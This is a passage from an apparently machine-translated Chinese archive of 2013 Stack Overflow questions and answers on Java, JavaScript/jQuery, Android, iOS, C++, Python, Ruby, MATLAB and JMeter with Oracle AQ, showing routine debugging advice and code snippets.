     exporter.exportReport(); } catch(Exception ex){ }
    } } 
```

*   我在这一行中有一些错误 List list = client.list(rd);

*   错误代码=没有找到适合list(pdfprint.ResourceDescriptor)方法的方法WSClient.list(String)不适用（实际参数pdfprint.ResourceDescriptor不能通过方法调用转换为String）方法WSClient.list(com.jaspersoft.jasperserver .api.metadata.xml.domain.impl.ResourceDescriptor) 不适用（实参pdfprint.ResourceDescriptor不能通过方法调用转换为com.jaspersoft.jasperserver.api.metadata.xml.domain.impl.ResourceDescriptor）

*   和 JasperPrint 打印机 = client.runReport(rd, params,list);

*   也有同样的错误

*   错误代码 = 找不到适合 runReport(pdfprint.ResourceDescriptor,Map,List) 方法的方法 WSClient.runReport(com.jaspersoft.jasperserver.api.metadata.xml.domain.impl.ResourceDescriptor,Map,List) 不适用（实际参数pdfprint.ResourceDescriptor无法通过方法调用转换为com.jaspersoft.jasperserver.api.metadata.xml.domain.impl.ResourceDescriptor)方法WSClient.runReport(com.jaspersoft.jasperserver.api.metadata.xml.domain.impl .ResourceDescriptor,Map) 不适用（实际参数列表和形式参数列表的长度不同）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T11:26:52.373

您正在传递 a`pdfprint.ResourceDescriptor`而不是 a `com.jaspersoft.jasperserver.api.metadata.xml.domain.impl.ResourceDescriptor`。

可能在您的 IDE 中，您不小心`ResourceDescriptor`在当前包中创建了一个类，而不是导入现有包。如果是这样，只需从包中删除该类并为正确的类添加导入语句，确保它位于项目的类路径中。

# javascript - .click() 在没有点击的时候被调用

> ID：15650882
> 
> 赞同：0
> 
> 时间：2013-03-27T02:20:51.207
> 
> 标签：javascript, jquery, html, onclick

我`.click`在 JavaScript 函数内的输入按钮类型中添加了一个函数。
该`.Click`函数调用另一个 JavaScript 函数。但是由于某种原因，该`.click`函数一直被调用。即使没有点击元素。
下面是我的代码。谢谢你的协助。

```
function loadBook(URL) {
    alert(URL);
};

function LoadAllBooks(URL, attachPoint) {
    var title = "This is some code bad code";
    var classname = title.replace(/\s/g, "");
    var htmlString = '<div class="' + classname + '"><input type="button" value="' + title + '"></div>';
    $(htmlString).appendTo(attachPoint).click(loadBook(URL));
}; 
```

**attachPoint**是 HTML 中的引用，由以下行获取。

```
 var attachpoint=document.querySelector('.buttonAttachPoint'); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-27T02:24:40.680

容易出错。通过在其中包含`(URL)`参数，您实际上是在`loadBook`立即调用该函数，而不是`loadBook`作为单击处理程序提供。

你需要做的更像是：

```
$(htmlString).appendTo(attachPoint).click( function(){ loadBook(URL) } ); 
```

创建一个运行 loadBook 的匿名函数，而不是直接运行 loadBook。

# android - 阻止 Firebug lite 在 Android 上自动打开控制台

> ID：15650885
> 
> 赞同：2
> 
> 时间：2013-03-27T02:21:12.130
> 
> 标签：android, google-chrome, firebug, firebug-lite

我使用下面的代码来阻止 Firebug lite 在 Android 设备上的 Chrome 上的页面加载时自动打开。

```
<script type="text/javascript" src="${cooingbStatic}/js/firebug-lite/build/firebug-lite.js#debug=false"> 
```

我也试过这个。

```
<script type="text/javascript" src="${cooingbStatic}/js/firebug-lite/build/firebug-lite.js#debug=false,startOpened=false"> 
```

但似乎两者都不起作用。

我尝试过的另一件事是……但这没有用。

```
<script type="text/javascript" src="${cooingbStatic}/js/firebug-lite/build/firebug-lite.js">
        {
           debug: false,
           startOpened: false
        }
</script> 
```

我正在使用 Firebug lite 1.4。

如何阻止 Firebug 在页面加载时自动打开控制台？

# java - 为测试目的创建一个 backtype.storm.tuple.Tuple？

> ID：15650886
> 
> 赞同：5
> 
> 时间：2013-03-27T02:21:23.913
> 
> 标签：java, scala, testing, apache-storm

我是[Storm](http://storm-project.net/)的新手，正在尝试研究如何编写一个螺栓测试来测试`execute(Tuple tuple)`子类中的方法`BaseRichBolt`。

问题是它似乎`Tuple`是不可变的，我没有看到任何方法或构建器来创建新的元组。如何创建自己的`Tuple`，或者如何使用测试输入测试螺栓？

我实际上使用的是 Scala，而不是 Java，但答案应该很容易翻译。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-27T02:54:17.650

模拟元组对象是[storm-starter 项目](https://github.com/nathanmarz/storm-starter/blob/master/test/jvm/storm/starter/tools/MockTupleHelpers.java)的一个很好的解决方案。这很简单：

```
package storm.starter.tools;

import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;
import backtype.storm.Constants;
import backtype.storm.tuple.Tuple;

public final class MockTupleHelpers {

    private MockTupleHelpers() {
    }

    public static Tuple mockTickTuple() {
        return mockTuple(Constants.SYSTEM_COMPONENT_ID, Constants.SYSTEM_TICK_STREAM_ID);
    }

    public static Tuple mockTuple(String componentId, String streamId) {
        Tuple tuple = mock(Tuple.class);
        when(tuple.getSourceComponent()).thenReturn(componentId);
        when(tuple.getSourceStreamId()).thenReturn(streamId);
        return tuple;
    }
} 
```

# ios - 不符合键值编码

> ID：15650890
> 
> 赞同：2
> 
> 时间：2013-03-27T02:21:49.910
> 
> 标签：ios, xcode, key

我的应用程序不断收到此错误。我收到错误的唯一一次是当我从后台状态恢复应用程序时。我需要一些帮助来找出错误所在。每次我从后台转到活动时都会发生这种情况，无论活动的 ViewController 是什么。

由于未捕获的异常“NSUnknownKeyException”而终止应用程序，原因：“[<__NSCFString 0xc063200> valueForUndefinedKey:]：此类与键响应的键值编码不兼容。”

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-27T02:28:35.090

听起来像是在堆栈中的某个地方，在 NSString 上访问了一个不存在的键。`valueForUndefinedKey`是 Objective-C 中键值编码的一部分，也是 NSObject 的一部分。`valueForKey:`当几乎对任何对象都不起作用时，可以调用它。

我看到在以下任一情况下最常抛出异常：

1.  具有 XIB 文件情节提要的类被重构，情节提要或 XIB 不会。
2.  您有一个主要的内存问题，您正在对已释放的对象调用方法并且访问了错误的内存。
3.  这是一个正在运行的网络 JSON API，并且该方法从 JSON 序列化的对象类型错误（例如 NSString 而不是 NSDictionary）。

在 Xcode 的 Breakpoint Navigator 中的 All Exceptions 上设置一个异常断点，这样您就可以找到代码`NSUnknownKeyException`中被抛出的确切行。按 (+) 调出菜单。

![断点导航器](../Images/d13ef182f9143b6783ce48485f0e7789.png)

# serialization - 如何将值对象存储在关系数据库中？

> ID：15650898
> 
> 赞同：1
> 
> 时间：2013-03-27T02:22:31.543
> 
> 标签：serialization, relational-database, value-objects

我正在处理一个大型项目，该项目有许多表示简单（不相关）值的对象。有时这些值是单个字符串，有时它们是两个字符串，有时是一个字符串和一个整数......

目前，我们的关系数据库中有一个“值”表，其中包含以下列：`Id`、`Category`、`String1`、`String2`...、`Int1`、`Int2`...`Double1`等。它很方便，但很乱。

这些值都具有以下属性：

*   每个具有相同属性的对象`Category`都具有相同的属性（即已键入）。
*   没有相关的对象（唯一的键是`Id`主键）。

我们如何摆脱这种混乱局面？在我看来，我们的选择如下：

1.  只需根据需要继续添加列，并忘记表和对象之间的语义映射。把它堆起来。
2.  为每个值对象创建一个新表。这将向数据库中添加大量表，其中大多数表少于 6 行。我担心所有这些额外的表都会添加到数据库中。
3.  仅为这些对象部署一个无模式的数据库（在我们的部署方案中实际上不可能）。
4.  创建一个带有`Id`、`Category`列和 BLOB`Value`列的表，并将值对象序列化到值列中。这可行吗？

[这篇文章](http://gojko.net/2009/09/30/ddd-and-relational-databases-the-value-object-dilemma/)重申了我们的选择。使用序列化是否有任何警告或陷阱？有没有我不知道的选项？欢迎咨询。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-29T17:44:39.387

[我从另一个相关问题](https://stackoverflow.com/questions/19661430/how-to-store-objects-in-a-relational-database)导航时偶然发现了这一点。虽然它已经很老了，但我很想回答，因为它不仅提出了一个很好的问题，而且还允许人们对整个*数据库非规范化进行争论。*

数据库被非规范化有很多原因，甚至更多的*借口*。性能可能是最重要的，但数据分类的困难（例如手头的问题）绝对是最常见的。此外，可以通过*多种方式*对数据库进行非规范化，其中很多都由 OP 解决。

但事实是，**在其他一切都失败后，****数据库应该作为*最后的手段***进行非规范化。其原因包括：

*   **数据对人类和 RDBMS 都**变得毫无意义。**有人很难理解，甚至很难记住一个命名字段`Integer1`或可能包含任何内容的序列化值的用途。并且 RDBMS 无法从序列化实体中提取值以对结果进行排序或应用聚合。**

***   **维护一个易变的模式是困难的**。数据库模式应该保持不变是有原因的。其他，更高的水平取决于它。如果架构在一夜之间发生变化，应用程序也应该发生变化，以反映新的状态。更糟糕的是，视图、存储过程和其他依赖的数据库组件变得同样难以维护。

    *   **无法强制执行约束，无法创建索引**。将序列化字段定义为外键或将其限制为一组特定的值是没有意义的。这取消了很多数据库的自我保护机制。更少的数据完整性意味着更多的管理成本。此外，索引在这里同样没用，使表对优化的开放性降低。

    *   **元数据最终必须以数据的形式存储**。想象一个多语言 CMS，其中有一个主`article`表来保存文章。现在，对于支持的每种语言，都有一个对应的`article_{lang}`表来保存翻译（即`article_en`，`article_fr`等`article_es`）。为了记录文章的现有翻译，应该创建一个“关系”表，其中包含`article`表的外键、语言 id、翻译表的表名和应该是翻译表的 FK 的字段*但不能定义为一*。然后，尝试编写一个查询来计算每篇文章的可用翻译！** 

 **所以尽可能避免非规范化。如果实体可以在一定程度上进行分类，那么[IS-A 关系](http://www.geomagas.gr/index.php/is-a-relations-in-relational-databases/)可能就是答案。为了支持任意属性，或者当分类不值得时，[一个键/值对表](http://www.sturnus.co.uk/performance/2008-07/the-curse-of-the-name-value-pair/)，具有表的外键来保存规范化数据，这已经足够牺牲了。**

# c++ - 没有使用 fstream 创建文件

> ID：15650901
> 
> 赞同：0
> 
> 时间：2013-03-27T02:22:57.177
> 
> 标签：c++, fstream

下面是我的程序：

```
#include <fstream>
#include <iostream>

using namespace std;

int main(int argc, char *argv[])
{
    fstream hd;
    hd.open("fstream.dat", fstream::in | fstream::out);

    hd.put('a');
    hd.close();
    return 0;
} 
```

但是，使用执行此程序后不会创建任何文件。它有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:31:50.810

您需要添加一个`fstream::app`或`fstream::trunc`标志位来指定如果文件已经存在（分别是追加或破坏）要做什么。

这也影响是否*创建*`fopen`文件有点特殊，但 C++ 从 C/POSIX函数继承了这一点。

# javascript - 动画滚动顶部事件不起作用

> ID：15650902
> 
> 赞同：0
> 
> 时间：2013-03-27T02:22:57.833
> 
> 标签：javascript, jquery, scrolltop

我正在尝试为动作设置动画`scrolltop`，但是当我单击返回顶部按钮时，它会在没有动画的情况下快速返回顶部，这可能是 CSS 参数错误吗？

这是脚本：

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script src="js/jquery.sticky.js"></script>
<script type="text/javascript"></script>
<script>
    $(window).scroll(function () {
        if($(this).scrollTop() > 990) {
            $('.scrollup').fadeIn(600)
        } else {
            $('.scrollup').fadeOut(300)
        }
    });
    $('.scrollup').click(function () {
        $('html, body').animate({
            scrollTop: 0
        }, 600);
        return false;
    });
</script> 
```

```
<div id="toparrow">
    <a href="#" class="scrollup">Scroll</a>
</div> 
```

和 CSS 元素：

```
#toparrow {

}
.scrollup {
    width:72px;
    height:45px;
    top:240px;
    left:927px;
    position:absolute;
    background: url('../img/generic/toparrow.png') bottom;
    display:none;
    text-indent:-9999px;
} 
```

和网站：[http ://www.citrontech.com/services](http://www.citrontech.com/services)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:29:07.953

因为按钮是一个锚点，`href="#"`这意味着转到顶部。您可以使用`preventDefault`来更改此浏览器行为。

```
 $('.scrollup').click(function(e){
   e.preventDefault();
   $('html, body').animate({ scrollTop: 0 }, 600);
     return false;
 }); 
```

更多关于`event.preventDefault`：[http ://api.jquery.com/event.preventDefault/](http://api.jquery.com/event.preventDefault/)

# python - 字符串的映射特性是否有助于更快地解析字符串？

> ID：15650904
> 
> 赞同：1
> 
> 时间：2013-03-27T02:23:14.360
> 
> 标签：python, regex, string, dictionary

我正在构建一个词典，它可以帮助我根据语音和拼写法查找英语单词。这本词典将帮助我找到我需要教孩子们的英语单词的具体例子。

为此，我制作了一个包含大约 200k 单词键的大型 Python 字典，其中的值是它们的语音。

例如，要查找词尾为**-aK*e**字形的词，其中 K* 可以是任意数量的辅音，我可以使用正则表达式解析所有键。

但是，我认为将单词实际映射为好像写在网格中会更聪明一些。所以我可以“书签”所有最后一个字母是*-e*的单词等等。因此，当我查找单词时，我可以简单地调用这些书签并确保获得成功，并且每次都减少要解析的单词数量，因为我像上面的示例一样通过多个条件搜索。

我的策略真的有意义吗？还是使用正则表达式来解决它？

我没有多少时间来编程，在我花宝贵的时间打字之前，我想要一些专家的建议。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T05:28:20.340

确实，这[`tries`](http://en.wikipedia.org/wiki/Trie)使得回答这些查询变得非常快速和高效。有点不清楚你是总是从词尾搜索还是从头开始搜索，但如果两者兼而有之，那么你将不得不为两个方向构建尝试。如果您需要在中间找到匹配项，那么这两种尝试都无济于事。

反向索引（例如那些为搜索引擎提供支持的索引）有时会通过将单词存储为字符[n-gram](http://en.wikipedia.org/wiki/N-gram)来解决此问题，然后存储 n-gram 之间的连接信息以构造单词。例如，“溢出”可能被分解为“ove”、“rfl”和“ow”，并且在某处存在一些元数据，指出存在一个组合这三个 n-gram 的单词。以不同的方式分解每个单词可以实现前导和尾随通配符查询，尽管我对细节很模糊：-/

**或者考虑**这样一个事实，除非性能对这个应用程序*非常*关键，否则对于这种字典大小，使用正则表达式可能足够快（并且可能会进一步优化），并且非常简单。使用 80k 词词典的快速测试：

```
with open('dictionary.txt') as fin:
    words = fin.read().strip().split('\n')

import re
import time
expr = re.compile(r'a[^aeiouy]+e$', re.I)

# Of course, this extends easily to using a dictionary, too
def bench():
    start = -time.time()
    matches = [word for word in words if expr.search(word)]
    return start + time.time() 
```

在我的计算机上大约需要 50 毫秒，并且为了使用正则表达式的简单性和清晰性以及您有限的时间，我认为这是值得的。

# javascript - 设置绘制点的数量 Rickshaw.js

> ID：15650911
> 
> 赞同：1
> 
> 时间：2013-03-27T02:23:45.287
> 
> 标签：javascript, d3.js, rickshaw

在[Rickshaw.js](http://code.shutterstock.com/rickshaw/ "人力车.js")中，我试图绘制一个有 100 个点的图形，但图中只显示了 10 个，并且时间点之间的点被忽略并简单地插值。如何控制图表上显示的点数？

# android - 如何在应用程序中隐藏标题文本？

> ID：15650917
> 
> 赞同：0
> 
> 时间：2013-03-27T02:24:23.473
> 
> 标签：android

在我的应用程序中，我在清单文件中使用 android:logo="@drawable/logo" 在顶部使用徽标而不是图标。唯一的问题是应用程序的标题文本仍然显示在它旁边。我已经看到了一些解决方案，但没有一个可以用我想要保留的当前 API 最小值 5 来完成。我该怎么做？并且请不要建议像其他类似问题中建议的那样设置 android:label="" ，因为这会使启动器图标也没有标签。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:38:50.710

只需将此行添加到您的活动中`onCreate`

```
setTitle(""); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T14:02:44.547

这个怎么样：在onCreate中使用：

```
requestWindowFeature(Window.FEATURE_NO_TITLE); 
```

这将隐藏您的图标和标题。现在在布局文件中的其他元素上方添加一个仅包含图标的线性或相对布局。

# android - 持续检查 Android 中的信号，然后启动应用程序

> ID：15650918
> 
> 赞同：0
> 
> 时间：2013-03-27T02:24:34.753
> 
> 标签：android, mobile

我正在开发一个项目，该项目在汽车引擎点火时通过蓝牙在 Android 上接收信号。一旦 Android 收到信号，手机将进入静音模式并断开所有呼叫，然后将消息发送给呼叫者。

我面临的问题是，Android 手机应该不断搜索信号，一旦收到它应该启动我编码的应用程序。如何连续检查信号？我必须使用Android的服务概念吗？怎么用？

我是安卓新手。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:28:43.243

您应该考虑使用[`BroadcastReceiver`](http://developer.android.com/reference/android/content/BroadcastReceiver.html).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:44:09.307

您必须使用服务来收听蓝牙。您将无法断开呼叫。

# java - Java：递归查找列表中的最小元素

> ID：15650928
> 
> 赞同：2
> 
> 时间：2013-03-27T02:25:07.427
> 
> 标签：java, list, recursion, minimum

我会先说这是家庭作业。我只是在寻找一些指示。我一直在用这个来绞尽脑汁，而对于我的一生，我就是不明白。我们被要求找到列表中的最小元素。我知道我需要一个子列表，但在那之后我不确定。任何指针都会很棒。谢谢。

```
/** Find the minimum element in a list.
 * 
 * @param t a list of integers
 * 
 * @return the minimum element in the list
 */ 
  public static int min(List<Integer> t) { 
  if (t.size() == 1){ 
  return t.get(0); 
  } 
  else{ 
      List<Integer> u = t.subList(1, t.size()); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T02:29:52.090

递归算法的要点是必须计算的所有内容都是通过返回值或附加参数完成的。在递归步骤的本地调用之外，您不应该有任何东西。

由于您必须找到最小元素，因此您应该考虑一些因素：

*   由一个元素组成的列表的最小元素是那个元素
*   通用列表的最小元素是第一个元素和剩余列表的最小值之间的最小值

考虑到这些，应该很容易实现。特别是因为递归算法具有与其算法描述非常相似的便利性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T02:34:26.727

您需要找到应用于列表的函数 min 和应用于子列表的函数 min 之间的关系。

min([abcde ...]) = f(a, min([bcde ...]))

现在你只需要找到函数 f。一旦你有了关系，那么实现它就很容易了。祝你好运。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T03:08:28.067

在最一般的意义上，递归是一个基于分解工作的概念，然后将较小的工作块委托给您自己的副本。要使递归起作用，您需要三个主要的东西：

1.  工作分解。你将如何让每一步“更简单”？
2.  递归调用。在某些时候，您的函数必须调用自己，但“工作”较少。
3.  基本情况。什么是会停止递归过程的（通常是微不足道的）最终情况？

在您的情况下，您正在尝试创建一个`min`在列表上运行的函数。您认为您可以通过每次将列表缩小一个来以某种方式减少（分解）您的工作是正确的（子列出第一个元素）。正如其他人所提到的，这个想法是根据“列表的其余部分”检查第一个元素（您刚刚提取的）。好吧，这就是信仰飞跃的地方。此时，您可以“假设”您的`min`函数将在子列表上运行，并且只需对子列表进行函数调用（递归调用）。现在你必须确保你的所有调用都会返回（即确保它不会永远递归）。这就是您的基本情况的用武之地。如果您的列表大小为 1，则唯一的元素是列表中最小的元素。无需致电`min`再次，只需返回（您在原始帖子中已经拥有的那部分）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-11-27T23:20:23.783

```
/**
 * The function computes the minimum item of m (-1 if m is empty). 
 * @param m: The MyList we want to compute its minimum item.
 * @return: The minimum item of MyList    
 */ 
public int minimum(MyList<Integer> m){

    int res = 0;
    int e0 = 0;
    int e1 = 0;

    // Scenarios Identification
    int scenario = 0;

    // Type 1\. MyLyst is empty
    if(m.length() == 0) {
        scenario = 1;
    }else {
    // Type 2\. MyLyst is not empty
        scenario = 2;
    }

    // Scenario Implementation
    switch(scenario) {

    // If MyLyst is empty
    case 1:
        res = -1;
        break;
        // If there is 1 or more elements   
    case 2:
        //1\. Get and store first element of array
        e0 = m.getElement(0);
        //2\. We remove the first element from MyList we just checked
        m.removeElement(0);
        //3\. We recursively solve the smaller problem
        e1 = minimum(m); 
        //4\. Compare and store results
        if(e0 < e1) {
            res = e0;
        }
        else {
            res = e1;
        }
        //5\. Return removed element back to the array
        m.addElement(0, e0);
        break;
    }
    //6\. Return result 
    return res;
} 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-12-11T20:29:01.277

好了，在方法中试试这个：

```
 public static Integer minimum(List<Integer> t) {
        int minInt;
       if (t.size() == 1) {
        return t.get(0);
       } else {
            int first = t.get(0);
            List<Integer> u = t.subList(1, t.size());
            minInt = Math.min(first, u.get(0));
            minInt = IntegerList.minimum(u);
          }
         return minInt;
      } 
```

希望这可以解决您的问题。

# matlab - 在赋值 A(I) = B 中，B 和 I 中的元素个数必须相同

> ID：15650930
> 
> 赞同：0
> 
> 时间：2013-03-27T02:25:51.320
> 
> 标签：matlab

现在，我明白了这里的问题，但我不明白的是应该如何初始化“我”？

例如，在我的例子中，变量“p”在每个 for 循环结束时生成一个数组，该数组被编程为运行 101 次。p 的输出看起来像这样

p =

-0.0149 -0.0149 现在，我想在每个 for 循环结束时将此值存储到另一个变量中并增加其索引。

那么，该变量的维度应该是多少？

我试过初始化---> A=rand(2,101);

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T03:02:33.977

If you don't wish to pre-allocate the array A. Then you can keep appending the values in `A` at the each for loop iteration as follows:

```
A=[];
for loop
   get p vector (every iteration it should be 2x1)
   A=[A p];
end 
```

Or you can directly write in the for loop:

```
 A(:,i)=p; %but your p vector seems to be 1x2 and not 2x1\. If it is 2x1, then you should initialize A as rand(101,2) 
```

# windows-phone - 在 windows phone 中添加音频

> ID：15650932
> 
> 赞同：-1
> 
> 时间：2013-03-27T02:25:56.487
> 
> 标签：windows-phone

我想将音频插入到我的项目中，当我导航到另一个页面时它不会停止。所以我不能使用 MediaElement。我该怎么办？请帮我。

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T09:27:52.343

您可以改用 MediaPlayer。

首先，将下一条语句添加到您的代码文件中：

```
using Microsoft.Xna.Framework;
using Microsoft.Xna.Framework.Media; 
```

然后在要播放 audo 的位置添加下一个代码。将 Uri 字符串更改为您的文件的字符串：

```
FrameworkDispatcher.Update();
Song song = Song.FromUri("SongName", new Uri("SongURI", UriKind.RelativeOrAbsolute)); // Change with your audio file URI
MediaPlayer.Play(song); 
```

如果您导航到其他页面，音频将继续播放，但如果您退出应用程序，音频将停止。

# jmeter - JMeter 和 Oracle AQ

> ID：15650935
> 
> 赞同：0
> 
> 时间：2013-03-27T02:26:27.433
> 
> 标签：jmeter, oracle-aq

有人有使用 JMeter 和 Oracle AQ 的经验吗？我正在尝试使用 JMS Publisher 将消息发布到 Oracle AQ 队列，但我拥有的唯一信息来自绑定文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-03T20:07:57.723

首先，阅读[本文档](http://docs.oracle.com/cd/E12839_01/web.1111/e13738/aq_jms.htm)（*Oracle® Fusion Middleware 为 Oracle WebLogic Server 配置和管理 JMS，第 8 章：与 Oracle AQ JMS 互操作*），它为您提供了有关 AQ 用户权限授予、AQ JMS 连接工厂名称和AQ 远程 JNDI JMS 目标名称。它确实说 WebLogic，但它们使用与我们完全相同的配置。

1.  将 Oracle JDBC jar (ojdbc6.jar) 和 Oracle AQ jar (aqapi.jar，在 Weblogic 的 $WL_HOME/server/lib 中找到) 放在 JMeter 的 lib 目录中。

2.  使用以下条目创建一个 jndi.properties 文件：

    ```
    java.naming.factory.initial=oracle.jms.AQjmsInitialContextFactory
    db_url=Your Oracle DB instance JDBC URL
    java.naming.security.principal=username_with_aq_permission_grants
    java.naming.security.credentials=password 
    ```

3.  将 jndi.properties 放入一个罐子中

    ```
    jar cf my-jndi-properties.jar jndi.properties 
    ```

    并将其放在同一个 JMeter lib 目录中。

4.  在 JMeter 中创建一个 JMS Publisher，并填写以下内容：

    1.  选中“使用 jndi.properties 文件”
    2.  连接工厂：[参见表 8-1](http://docs.oracle.com/cd/E12839_01/web.1111/e13738/aq_jms.htm#JMSAD595)并放置一个 AQ JMS 前缀值。不要使用通用工厂。
    3.  目的地：Queues/Your_Queue_Name 或 Topics/Your_Topic_Name
    4.  取消选中“使用授权？”

    填写您还需要什么。

5.  玩得开心。

感谢[David L](http://anythingsimple.blogspot.com.br/2009/03/setup-jmeter-jms-publisher-sampler.html)提供 jndi.properties 信息。

# java - 如何编程 showDialogMessage？

> ID：15650936
> 
> 赞同：0
> 
> 时间：2013-03-27T02:26:42.780
> 
> 标签：java, swing, user-interface

我刚刚编写了一个关于用户注册的界面。对于删除用户部分，当我单击删除按钮时，程序将显示一个框询问“您确定要删除用户吗？” 如果我选择是，那么我该如何编程来显示一个 showDialogMessage 来告诉用户用户已被删除？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:38:14.510

只是在这里投球，但如果您使用的是 swing，请查看[JOptionPane](http://docs.oracle.com/javase/1.4.2/docs/api/javax/swing/JOptionPane.html)尤其是`showMessageDialog`方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T03:23:06.310

`JOptionPane.showConfirmDialog(Component parentComponent, Object message)` 这是为了获得用户的确认。

`JOptionPane.showMessageDialog(Component parentComponent, Object message)`这是为了表明用户已被删除。

既然你的问题不完整，就用 Swing 的对比来回答

`int i=JOptionPane.showConfirmDialog(null,"Are you sure about deleting the user?");`
`if(i==0) JOptionPane.showMessageDialog(null,"User deleted");`

`0`如果选择的是，确认框返回，如果选择的是`yes`，如果选择的是`1``no``2``cancel`

通过[JOptionPane](http://docs.oracle.com/javase/6/docs/api/javax/swing/JOptionPane.html)你会得到更好的主意。

# ruby-on-rails - 在 ubuntu 12.04.1 上 rvmsudo apt-get 时出现无效操作错误

> ID：15650937
> 
> 赞同：-1
> 
> 时间：2013-03-27T02:26:54.187
> 
> 标签：ruby-on-rails, ubuntu, nginx, rvm, passenger

我们使用 rvm 1.19.0 安装 libcurl4-openssl-dev （用于乘客和 nginx 用于 Rails）。然而出现了错误。然后我们按照建议运行以下命令：

```
$export rvmsudo_secure_path=1 
```

现在出现另一个无效操作错误，如下所示：

```
ubuntu@$ rvmsudo apt-get libcurl4-openssl-dev
E: Invalid operation libcurl4-openssl-dev 
```

rvm有什么问题？谢谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T03:54:48.450

`rvmsudo apt-get install libcurl4-openssl-dev`

# ruby - 为什么要分配这个奇怪的值？

> ID：15650938
> 
> 赞同：1
> 
> 时间：2013-03-27T02:26:57.493
> 
> 标签：ruby

```
class MyClass
  def fun
    a = 2
    b = 5
    yield(a,b)
  end

  def self.fun2
    puts self
  end
end

m = 1
n = 2
mine = MyClass.new
mine.fun {|m| puts "m = #{m} n = #{n}"} 
```

这里我故意不匹配yield的参数个数，输出为

```
test.rb:16: warning: multiple values for a block parameter (2 for 1)
from test.rb:5
m = 25 n = 2 
```

这个 25 是从哪里来的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:36:38.033

我怀疑你在`1.8.x`。

在这种情况下，`m`将是`[a, b]`。这相当于`[2, 5]`.

```
[2, 5].to_s
# => "25"

"m = #{[2, 5]} n = #{2}"
# => "m = 25 n = 2" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:30:27.273

25 来自`a`并作为数组`b`传递给。`m`

当你`puts`这样做时，这就是你在 Ruby 1.8 中得到的输出。

你也可以尝试做`puts "m = #{m.inspect}...."`或`puts "m = #{m.class.to_s}"`

# python - 用 BeautifulSoup 删除不必要的重复标签

> ID：15650947
> 
> 赞同：5
> 
> 时间：2013-03-27T02:27:57.580
> 
> 标签：python, beautifulsoup

我正在使用 Python 和 BeautifulSoup 从 html 中提取一些文本。我有一些包含表单文本的 html

```
<h3><b> Abc </b><b> DEF </b> </h3> 
```

我想删除重复的 b 标签。有没有快速的方法来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T06:46:11.473

对于 bs4 这似乎工作得很好

```
In [4]: soup.h3
Out[4]: <h3><b> Abc </b><b> DEF </b> </h3>

In [5]: soup.h3.text
Out[5]: u' Abc  DEF  ' 
```

在此处查看文档和软件包： [https ://beautiful-soup-4.readthedocs.org/en/latest/](https://beautiful-soup-4.readthedocs.org/en/latest/) [https://pypi.python.org/pypi/beautifulsoup4](https://pypi.python.org/pypi/beautifulsoup4)

# jquery - 在桌面和移动设备上使滚动 div '平滑滚动'？不要锚定标签

> ID：15650950
> 
> 赞同：0
> 
> 时间：2013-03-27T02:28:34.833
> 
> 标签：jquery, css, smooth-scrolling

该网站可以在[这里](http://www.tomsalta.com/?page_id=8)查看。

我希望滚动框在桌面和移动设备上平滑滚动。不是平滑滚动到锚点，只是正常滚动。我尝试了一个 CSS3 过渡和一个不适合我的 jQuery 插件。

# php - 如何使用 jquery 读取多级 json 格式

> ID：15650956
> 
> 赞同：1
> 
> 时间：2013-03-27T02:28:57.937
> 
> 标签：php, jquery, json

我有一个像

```
[
    {
        id: 15,
        diemdung: "a"
    },
    {
        id: "16",
        diemdung: "b",
        khoangcach: "300",
        pho: "c",
        da: [
            {
                lancan: "d",
                kc: "333"
            },
            {
                lancan: "e",
                kc: "322"
            }
        ]
    },
    ...
] 
```

我使用 php 之类的`print json_encode($rows);`
，我尝试使用 jquery 在客户端读取它

```
$.getJSON(url,function(json){
    $.each(json,function(key, val){
        $.each(this.da,function(){
            alert(this.kc);
        });
    });
}); 
```

但它不起作用。我该怎么做？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:55:32.343

如果您的代码正常工作，您可能会收到以下错误：

```
TypeError: obj is undefined 
```

这是因为外部数组中的第一个对象没有“da”属性的值。在您尝试遍历“da”属性持有的数组之前，您应该检查它是否存在。

尝试：

```
$.getJSON(url,function(json){
    $.each(json,function(){
        if (this.da) {
            $.each(this.da,function(){
                alert(this.kc);
            });
        }
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:40:14.013

```
 $.each(json, function(arrayID, arrayVal) {
  //alert(arrayVal.id);
  $.each(arrayVal.da, function(daKey,daData) {
   alert(daData.kc);
  });
 }); 
```

这是我不久前的相同问题以获取更多代码

[JQuery $.each() JSON 数组对象迭代](https://stackoverflow.com/questions/6298599/jquery-each-json-array-object-iteration)

编辑以重命名一些变量以使其更清晰

* * *

## 回答 #3

> 赞同：0
> 
